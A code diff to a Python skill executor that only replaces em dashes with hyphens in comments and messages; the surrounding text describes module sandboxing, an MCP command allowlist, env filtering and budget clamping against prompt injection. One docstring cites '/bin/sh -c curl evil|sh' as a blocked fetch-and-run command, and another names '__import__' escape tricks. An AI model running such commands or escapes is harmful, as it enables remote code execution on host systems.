@@ -1,16 +1,16 @@
-"""Skill tool execution — runs Python and MCP tools with budget tracking.
+"""Skill tool execution - runs Python and MCP tools with budget tracking.
 
 Security model for skill execution:
 
 - ``python`` tools resolve ``module`` to a ``.py`` file under the skill's own
   directory via ``importlib.util.spec_from_file_location``. Dotted module
-  names like ``os`` or ``subprocess`` are NOT importable — modules must live
+  names like ``os`` or ``subprocess`` are NOT importable - modules must live
   inside the skill. We never modify ``sys.path``.
 - ``function`` names must be public identifiers; dunder/underscore-prefixed
   names are refused to block ``__import__`` / ``__class__.__subclasses__``
   style escapes via tool arguments.
 - ``mcp`` tools require ``server_command`` to be on a per-skill allowlist
-  (built-in skills only — community skills must opt in explicitly via
+  (built-in skills only - community skills must opt in explicitly via
   ``DEEPR_SKILL_ALLOW_MCP_COMMANDS=*`` or a comma-list). We do NOT merge the
   full host env into the subprocess; only env keys listed in ``server.env``
   are passed through, with ``${VAR}`` substitution from ``os.environ``.
@@ -414,7 +414,7 @@ class SkillExecutor:
     async def _execute_mcp(self, tool: SkillTool, arguments: dict) -> dict[str, Any]:
         """Spawn/reuse MCP server, proxy the call, handle timeout.
 
-        Enforces the subprocess command allowlist — community skills
+        Enforces the subprocess command allowlist - community skills
         cannot run ``/bin/sh -c curl evil|sh`` unless the operator
         explicitly opted in via ``DEEPR_SKILL_ALLOW_MCP_COMMANDS``.
         """
@@ -423,7 +423,7 @@ class SkillExecutor:
 
         if not _mcp_command_allowed(tool.server_command):
             logger.warning(
-                "Refusing to spawn MCP server %r for skill %s — not in allowlist; "
+                "Refusing to spawn MCP server %r for skill %s - not in allowlist; "
                 "set DEEPR_SKILL_ALLOW_MCP_COMMANDS to permit",
                 tool.server_command,
                 self._skill.name,
@@ -436,7 +436,7 @@ class SkillExecutor:
         # Enforce the skill's per-call budget cap on any caller/model-supplied
         # ``budget`` argument. Paid first-party MCP tools (primr/distillr)
         # accept a ``budget`` parameter and will spend up to it. Without
-        # clamping, the model — or prompt-injected content steering it — could
+        # clamping, the model - or prompt-injected content steering it - could
         # pass an arbitrarily large budget and blow past both the manifest
         # ``max_per_call`` and whatever budget the skill has left.
         tool_props = (tool.parameters or {}).get("properties", {})
